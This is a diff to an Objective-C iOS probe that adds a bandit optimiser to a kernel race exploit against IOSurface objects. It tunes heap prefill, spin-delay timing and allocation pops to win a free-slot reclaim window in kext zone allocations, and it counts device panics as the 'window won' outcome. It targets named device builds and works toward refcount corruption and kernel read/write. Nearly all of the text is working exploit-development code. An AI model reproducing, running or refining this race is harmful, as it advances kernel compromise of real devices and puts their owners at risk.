@@ -43,6 +43,7 @@
 #import "LabDeviceProfile.h"
 #import "LabIntelOffsets.h"
 #import "LabLocalTime.h"
+#import "LabBandit.h"
 
 #import <Foundation/Foundation.h>
 #import <CoreFoundation/CoreFoundation.h>
@@ -52,16 +53,19 @@
 #import <pthread.h>
 #import <signal.h>
 #import <sched.h>
+#import <stdint.h>
+#import <stdio.h>
 #import <string.h>
 #import <stdatomic.h>
 #import <mach/mach.h>
 #import <mach/thread_policy.h>
 #import <sys/qos.h>
 
-#define P110_BUILD      @"p110-swapclaim-v1.1"
+#define P110_BUILD      @"p110-swapclaim-v1.2-bandit"
 #define P110_ROUNDS     64
-#define P110_PREFILL    6       /* pre-created live sibling-client objects */
-#define P110_POP        2       /* fresh creates popped AT the window      */
+#define P110_PREFILL_MAX  8     /* bandit arm room: prefill 6 (default) vs 8 */
+#define P110_PREFILL_DEF  6     /* the v1 shipped prefill(6) pop-law value   */
+#define P110_POP        2       /* fresh creates popped AT the window        */
 #define P110_DIAL_MAX   20000   /* ns spin cap for the 267 v10 dial law    */
 #define P110_GO_TIMEOUT_MS 2000 /* bounded: one window per round           */
 
@@ -117,6 +121,51 @@ static atomic_int v_claim_won_proc;
 static atomic_int v_aborted_proc;
 
 static NSMutableString *g_log = nil;
+
+/* ---- v1.2 bandit (LabBandit shared harness): one pick per tap -------------
+   Arms span the three race-shape knobs ALREADY in this file — no new race
+   shapes (LabBandit law: arms = existing code paths, trivially gated). The
+   rounds inside one tap share the arm; the shared ledger
+   (Documents/lab_bandit.json) learns across reboot cycles on both SKUs.
+     0 "p6-dial0-popwin"   : prefill 6, dial pinned 0ns, +2 pop in-window
+     1 "p6-b200-popwin"    : prefill 6, the +200ns exponential bump law
+                             (the v1.1 shipped law — one slot per lost round)
+     2 "p8-b200-popwin"    : prefill 8, the +200ns bump law
+     3 "p6-dial0-popearly" : prefill 6, dial 0, the SAME +2 fresh creates
+                             issued EARLY pre-window (pop-timing calibration)
+   Outcomes = the existing (a)/(b)/(c) words on the shared reward map:
+   window-lost / family-b / claim-won (+ "abort" = the bounded re-park /
+   unwind stops). The (b) class is recorded by LabBandit's dirty-boot
+   attribution: a PROVEN kern.boottime change on an open round = the device
+   panicked on the IN FLIGHT line = the attested Family-B class; the same
+   boot = the in-process SIGBUS/EFAULT-class (b) catch killed the process
+   (the only exit that leaves the round open; a force-quit looks identical —
+   the log's handler line names the round). */
+static const char *const g_p110_arms[4] = {
+    "p6-dial0-popwin", "p6-b200-popwin", "p8-b200-popwin", "p6-dial0-popearly"
+};
+static int  g_p110_arm;                       /* one arm per tap             */
+static int  g_p110_prefillN = P110_PREFILL_DEF;
+static BOOL g_p110_dialBase0;                 /* arms 0/3: the dial stays 0  */
+static BOOL g_p110_popEarly;                  /* arm 3: +2 pop pre-window    */
+static const LabBanditSeedRow g_p110_seeds[] = {
+    /* documented p110 claim-oracle history, approximate and honestly
+       labeled by the seeded_from string: the v1/v1.1 ledger note — 113
+       accumulated process-lifetime window counts under the v1 shape
+       (= this arm). Other arms have no documented rounds; zero seeds. */
+    { "p6-b200-popwin", "window-lost", 113 },
+};
+static void p110_arm_apply(void) {
+    g_p110_prefillN = P110_PREFILL_DEF;
+    g_p110_dialBase0 = NO;
+    g_p110_popEarly = NO;
+    switch (g_p110_arm) {
+        case 0: g_p110_dialBase0 = YES; break;
+        case 2: g_p110_prefillN = 8; break;
+        case 3: g_p110_dialBase0 = YES; g_p110_popEarly = YES; break;
+        default: break;   /* case 1 = the v1.1 law verbatim */
+    }
+}
 
 /* ---- fsync log: every line hits disk before the probe continues -------- */
 static void L(NSString *s) {
@@ -275,10 +324,15 @@ static void *p110_t_reclaim(void *arg) {
            and the +2 pop — the 267 v10 one-slot calibration law           */
         long d = g_dial;
         for (volatile long i = 0; i < d; i++) { }
-        for (int i = 0; i < P110_POP; i++) {
-            uint32_t sid = 0;
-            g_pop[i] = p110_create(&sid);   /* genuine IOSurface-class alloc */
-            g_pop_sid[i] = sid;             /* into the kext zalloc sites    */
+        /* bandit arm 3 (popearly): the +2 fresh creates were ALREADY issued
+           pre-window by the tap thread — this thread returns idle so the
+           window shape (engine/destroy releases) is unchanged             */
+        if (!g_p110_popEarly) {
+            for (int i = 0; i < P110_POP; i++) {
+                uint32_t sid = 0;
+                g_pop[i] = p110_create(&sid);   /* genuine IOSurface-class alloc */
+                g_pop_sid[i] = sid;             /* into the kext zalloc sites    */
+            }
         }
         __sync_synchronize();
         g_st_p = TST_DONE;
@@ -351,10 +405,35 @@ static NSString *p110_flags_law(void) {
        @"marked IN FLIGHT before arming (post-panic outcome-(b) attribution).",
        P110_ROUNDS);
 
+    /* ---- v1.2 bandit: shared ledger + dirty-boot attribution + one pick
+       per tap (Documents/lab_bandit.json). The pick lands after the SKU
+       gate + dlsym below, so the knobs apply to every raced round. -------- */
+    {
+        char attr[256];
+        int a = LabBanditRegister("p110", g_p110_arms, 4, g_p110_seeds, 1,
+            "p110 claim-oracle v1/v1.1 rounds (approximate, honestly labeled): "
+            "the 12:06-round ledger note — 113 accumulated process-lifetime "
+            "window counts under the v1 shape; the other arms seed at zero",
+            /* boot change on an open round = device panic on the IN FLIGHT
+               line = design outcome (b), the attested Family-B class        */
+            "family-b",
+            /* same boot = the in-process SIGBUS/EFAULT-class (b) catch killed
+               the process (the only unclosed exit; a force-quit looks the
+               same — the log's handler line names the round)               */
+            "family-b",
+            attr, sizeof attr);
+        if (a == 1 || a == 2)
+            Lf(@"[bandit] %@", [NSString stringWithUTF8String:attr]);
+        else if (a < 0)
+            Lf(@"[bandit] shared ledger load FAILED — this round may not "
+               @"attribute after a panic");
+    }
+
     /* SKU gate: HOLD prints ident and returns; both target SKUs run */
     LabSku sku = [LabDeviceProfile detectedSku];
     if (sku != LabSkuA14_23F77 && sku != LabSkuT8150_24A435) {
         L(@"[-] HOLD: this SKU/build has no 112477 lane row — ident printed, nothing raced.");
+        LabBanditRoundClose("p110", NULL);   /* nothing raced: no arm outcome */
         if (g_fd >= 0) { (void)fcntl(g_fd, F_FULLFSYNC); (void)close(g_fd); g_fd = -1; }
         return g_log;
     }
@@ -369,6 +448,7 @@ static NSString *p110_flags_law(void) {
     if (!ios) ios = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
     if (!ios) {
         L(@"[-] IOSurface framework dlopen failed — probe stopped, nothing raced");
+        LabBanditRoundClose("p110", NULL);
         if (g_fd >= 0) { (void)fcntl(g_fd, F_FULLFSYNC); (void)close(g_fd); g_fd = -1; }
         return g_log;
     }
@@ -387,8 +467,25 @@ static NSString *p110_flags_law(void) {
     }
     if (!g_create || !g_getid || !g_lookup) {
         L(@"[-] required dlsyms absent (Create/GetID/Lookup) — probe stopped, nothing raced");
+        LabBanditRoundClose("p110", NULL);
         if (g_fd >= 0) { (void)fcntl(g_fd, F_FULLFSYNC); (void)close(g_fd); g_fd = -1; }
         return g_log;
+    }
+
+    /* ---- v1.2 bandit PICK (one arm per tap; the rounds inside this tap
+       share it). Existing code paths only — see g_p110_arms above. -------- */
+    {
+        char pickLine[160];
+        g_p110_arm = LabBanditPick("p110", pickLine, sizeof pickLine);
+        p110_arm_apply();
+        Lf(@"[bandit] %@", [NSString stringWithUTF8String:pickLine]);
+        char sc[512];
+        if (LabBanditScores("p110", sc, sizeof sc) >= 0)
+            Lf(@"[bandit] UCB1 %s", sc);
+        Lf(@"[bandit] arm=%s -> prefill=%d dial=%s pop=%s (Documents/lab_bandit.json)",
+           LabBanditArmName("p110", g_p110_arm), g_p110_prefillN,
+           g_p110_dialBase0 ? "pinned-0ns" : "+200ns-bump-law",
+           g_p110_popEarly ? "EARLY-pre-window" : "in-window");
     }
 
     /* (b) userspace alias-path fault catcher */
@@ -406,11 +503,11 @@ static NSString *p110_flags_law(void) {
     (void)pthread_create(&td, NULL, p110_t_destroy, NULL);
     (void)pthread_create(&tp, NULL, p110_t_reclaim, NULL);
 
-    /* ---- prefill(6): pre-created LIVE sibling-client objects (marker-law sids) ---- */
-    IOSurfaceRef prefill[P110_PREFILL];
-    uint32_t prefill_sid[P110_PREFILL];
+    /* ---- prefill(<bandit>) : pre-created LIVE sibling-client objects ---- */
+    IOSurfaceRef prefill[P110_PREFILL_MAX];
+    uint32_t prefill_sid[P110_PREFILL_MAX];
     int prefill_n = 0;
-    for (int i = 0; i < P110_PREFILL; i++) {
+    for (int i = 0; i < g_p110_prefillN; i++) {
         prefill[i] = p110_create(&prefill_sid[i]);
         if (prefill[i]) {
             prefill_n++;
@@ -418,14 +515,16 @@ static NSString *p110_flags_law(void) {
                 volatile uint8_t *b = (volatile uint8_t *)g_base(prefill[i]);
                 if (b) b[0] = (uint8_t)(P110_MARKER + i);
             }
-            Lf(@"[prefill %d/6] sid=%08x alive (claim-candidate class, kext zalloc/kalloc-type site)",
-               i + 1, prefill_sid[i]);
+            Lf(@"[prefill %d/%d] sid=%08x alive (claim-candidate class, kext zalloc/kalloc-type site)",
+               i + 1, g_p110_prefillN, prefill_sid[i]);
         } else {
-            Lf(@"[prefill %d/6] create FAILED — honest, bounded count adjusted", i + 1);
+            Lf(@"[prefill %d/%d] create FAILED — honest, bounded count adjusted", i + 1, g_p110_prefillN);
         }
     }
-    Lf(@"[*] prefill(6) done: %d/6 live claim candidates; +2 fresh creates per round (pop law, "
-       @"affinity tag 1 = one magazine)", prefill_n);
+    Lf(@"[*] prefill(%d) done: %d/%d live claim candidates; +2 fresh creates per round "
+       @"(%s pop law, affinity tag 1 = one magazine)",
+       g_p110_prefillN, prefill_n, g_p110_prefillN,
+       g_p110_popEarly ? "EARLY-pre-window bandit arm" : "in-window");
 
     /* ---- the 64-round D-thread cycle ---- */
     long dial = 0;              /* 267 v10 dial: bump one slot per window-lost round */
@@ -463,6 +562,7 @@ static NSString *p110_flags_law(void) {
             Lf(@"[r %d/%d] OUTCOME (a) WINDOW LOST (honest) — create failed, nothing raced; "
                @"dial stays %ldns", r, P110_ROUNDS, dial);
             atomic_fetch_add(&v_win_lost, 1); atomic_fetch_add(&v_win_lost_proc, 1);
+            LabBanditRecord("p110", g_p110_arm, "window-lost");
             if (sib) { p110_release(sib); sib = NULL; }
             continue;
         }
@@ -474,10 +574,25 @@ static NSString *p110_flags_law(void) {
            this line, the outcome was (b) = window WON, free slot (the
            attested Family-B class). Honest print, no success claim.        */
         Lf(@"[r %d/%d] IN FLIGHT — D: owner-release sid=%08x (destroy-twin class) / "
-           @"E: owner-release the round surface (detacher half) / P: pop(6+2) dial %ldns, "
-           @"same CPU. If the device reboots here: outcome (b), Family-B far "
+           @"E: owner-release the round surface (detacher half) / P: pop(%d+2, %s) "
+           @"dial %ldns, same CPU. If the device reboots here: outcome (b), Family-B far "
            @"0x0020000000000048 = window WON, free slot (attested class).",
-           r, P110_ROUNDS, sid, dial);
+           r, P110_ROUNDS, sid, g_p110_prefillN,
+           g_p110_popEarly ? "EARLY-pre-window" : "in-window", dial);
+
+        /* bandit arm 3 (popearly): the SAME +2 fresh creates issued EARLY,
+           pre-window — the pop-timing calibration arm; everything else in
+           the round is unchanged (the reclaim thread stays idle in-window). */
+        if (g_p110_popEarly) {
+            for (int i = 0; i < P110_POP; i++) {
+                uint32_t psid = 0;
+                g_pop[i] = p110_create(&psid);
+                g_pop_sid[i] = psid;
+            }
+            Lf(@"[r %d/%d] pop EARLY (pre-window): the +2 fresh creates issued "
+               @"before the gate (bandit pop-timing calibration arm)",
+               r, P110_ROUNDS);
+        }
 
         /* arm the racers */
         g_e_target = s;              /* T_engine drops the round A-ref        */
@@ -500,6 +615,7 @@ static NSString *p110_flags_law(void) {
             Lf(@"[r %d/%d] ABORTED ROUND (honest): racers never re-parked "
                @"(E-park=%d D-park=%d P-park=%d) — bounded stop, no retry storm",
                r, P110_ROUNDS, g_park_e, g_park_d, g_park_p);
+            LabBanditRecord("p110", g_p110_arm, "abort");
             g_run = false;
             break;
         }
@@ -526,6 +642,7 @@ static NSString *p110_flags_law(void) {
             Lf(@"[r %d/%d] ABORTED ROUND (honest): racer(s) missed the window "
                @"(E=%d D=%d P=%d) — bounded stop, no retry storm",
                r, P110_ROUNDS, g_st_e, g_st_d, g_st_p);
+            LabBanditRecord("p110", g_p110_arm, "abort");
             g_run = false;
             break;
         }
@@ -591,14 +708,24 @@ static NSString *p110_flags_law(void) {
             atomic_fetch_add(&v_claim_won, 1); atomic_fetch_add(&v_claim_won_proc, 1);
             Lf(@"[r %d/%d] OUTCOME (c) CLAIM-WON-CANDIDATE (proxy-class evidence, no "
                @"success claim): %@", r, P110_ROUNDS, evidence);
+            LabBanditRecord("p110", g_p110_arm, "claim-won");
             dial = 0;             /* a won window resets the dial (267 v10 law) */
         } else {
             atomic_fetch_add(&v_win_lost, 1); atomic_fetch_add(&v_win_lost_proc, 1);
-            long nd = dial ? dial * 2 : 200;
-            if (nd > P110_DIAL_MAX) nd = P110_DIAL_MAX;
-            dial = nd;
-            Lf(@"[r %d/%d] OUTCOME (a) WINDOW LOST (honest) — clean round, no anomaly; "
-               @"dial one slot -> %ldns", r, P110_ROUNDS, dial);
+            if (g_p110_dialBase0) {
+                /* bandit arm 0/3: dial cadence base 0ns — the calibration
+                   spin stays pinned at zero (no bump path) */
+                dial = 0;
+                Lf(@"[r %d/%d] OUTCOME (a) WINDOW LOST (honest) — clean round, no anomaly; "
+                   @"dial pinned 0ns (bandit dial-base-0 arm)", r, P110_ROUNDS);
+            } else {
+                long nd = dial ? dial * 2 : 200;
+                if (nd > P110_DIAL_MAX) nd = P110_DIAL_MAX;
+                dial = nd;
+                Lf(@"[r %d/%d] OUTCOME (a) WINDOW LOST (honest) — clean round, no anomaly; "
+                   @"dial one slot -> %ldns", r, P110_ROUNDS, dial);
+            }
+            LabBanditRecord("p110", g_p110_arm, "window-lost");
         }
 
         /* round teardown (bounded; magazine law stays reproducible)        */
@@ -622,7 +749,7 @@ static NSString *p110_flags_law(void) {
     (void)pthread_join(tp, NULL);
 
     /* end-state honesty: drop every prefill candidate */
-    for (int i = 0; i < P110_PREFILL; i++) {
+    for (int i = 0; i < P110_PREFILL_MAX; i++) {
         if (prefill[i]) { p110_release(prefill[i]); prefill[i] = NULL; }
     }
     if (prev_sib) { p110_release(prev_sib); prev_sib = NULL; }
@@ -652,6 +779,16 @@ static NSString *p110_flags_law(void) {
       @"this door (note-152 m2scaler = the pairing candidate on 23F77).");
     L(@"HONESTY: kread=NO kwrite=NO hasKread=NO. Verdict = claim-oracle + refcount/flag "
       @"corruption CLASS evidence; no success claim is made without flags/alias evidence.");
+
+    /* v1.2 bandit: close the open round (per-round outcomes recorded above;
+       the summary is the session's dominant shape — a panic or the in-process
+       (b) catch instead leaves the round open for the shared dirty-boot
+       attribution law). */
+    LabBanditRoundClose("p110", ab ? "abort" : (cw ? "claim-won" : "window-lost"));
+    Lf(@"[bandit] round closed: arm=%s outcomes this session: window-lost=%d "
+       @"claim-won=%d aborted=%d (Documents/lab_bandit.json)",
+       LabBanditArmName("p110", g_p110_arm), wl, cw, ab);
+
     if (g_fd >= 0) { (void)fcntl(g_fd, F_FULLFSYNC); (void)close(g_fd); g_fd = -1; }
     return g_log;
 }
